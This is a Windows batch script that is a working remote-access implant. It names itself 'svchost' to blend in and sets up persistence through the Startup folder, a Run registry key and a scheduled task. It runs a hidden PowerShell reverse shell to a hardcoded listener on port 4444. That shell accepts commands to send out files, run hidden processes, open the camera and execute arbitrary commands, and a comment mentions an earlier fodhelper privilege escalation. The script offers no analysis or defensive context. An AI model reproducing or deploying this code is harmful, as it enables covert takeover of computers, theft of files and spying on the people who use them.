@echo off
setlocal enabledelayedexpansion

:: ===== CONFIGURATION =====
set "listenerIP=10.10.16.13"
set "listenerPort=4444"
set "checkInterval=5"

:: ===== SKIP ELEVATION (already running elevated via fodhelper) =====
:: net session >nul 2>&1
:: if %errorlevel% neq 0 (
::     mshta "javascript: var shell = new ActiveXObject('Shell.Application'); shell.ShellExecute('%~s0', '', '', 'runas', 0); close();"
::     exit /b
:: )

:: ===== STEALTH TITLE =====
title svchost

:: ===== INSTALL PERSISTENCE =====
set "appData=%APPDATA%\Microsoft\Windows\Templates"
if not exist "%appData%" mkdir "%appData%"

set "targetBat=%appData%\svchost.bat"
copy /y "%~f0" "%targetBat%" >nul 2>&1

copy /y "%targetBat%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTemplates" /t REG_SZ /d "%targetBat%" /f >nul 2>&1
schtasks /create /tn "WindowsTemplatesUpdate" /tr "\"%targetBat%\"" /sc onlogon /rl highest /f >nul 2>&1

:: ===== DIRECT REVERSE SHELL =====
:loop
powershell -WindowStyle Hidden -Command ^
"$c=New-Object System.Net.Sockets.TCPClient('%listenerIP%',%listenerPort%);" ^
"$s=$c.GetStream();" ^
"[byte[]]$b=0..65535|%%{0};" ^
"while(($i=$s.Read($b,0,$b.Length))-ne 0){" ^
"  $d=([Text.Encoding]::ASCII).GetString($b,0,$i);" ^
"  $r='';" ^
"  if($d -match '^get (.+)'){" ^
"    $f=$matches[1];" ^
"    if(Test-Path $f){" ^
"      $n=Split-Path $f -Leaf;" ^
"      $c2=[Convert]::ToBase64String([IO.File]::ReadAllBytes($f));" ^
"      $r='FILE:'+([IO.File]::ReadAllBytes($f).Length)+':$n'+[Environment]::NewLine+$c2" ^
"    }else{$r='ERROR: File not found'}" ^
"  }" ^
"  elseif($d -match '^run (.+)'){" ^
"    $a=$matches[1] -split ' ',2;" ^
"    $psi=New-Object System.Diagnostics.ProcessStartInfo;" ^
"    $psi.FileName=$a[0];" ^
"    if($a[1]){$psi.Arguments=$a[1]};" ^
"    $psi.WindowStyle='Hidden';" ^
"    $psi.CreateNoWindow=$true;" ^
"    $psi.UseShellExecute=$false;" ^
"    [System.Diagnostics.Process]::Start($psi);" ^
"    $r='OK '+$a[0]+' launched invisible'" ^
"  }" ^
"  elseif($d -eq 'camera'){" ^
"    start microsoft.windows.camera:;" ^
"    $r='Camera opened'" ^
"  }" ^
"  else{" ^
"    $r=(cmd /c $d' 2>&1' | Out-String).Trim()" ^
"  }" ^
"  $sb=([text.encoding]::ASCII).GetBytes($r+'`nPS '+(pwd).Path+'> ');" ^
"  $s.Write($sb,0,$sb.Length);" ^
"  $s.Flush()" ^
"};" ^
"$c.Close()"

timeout /t %checkInterval% /nobreak >nul
goto loop
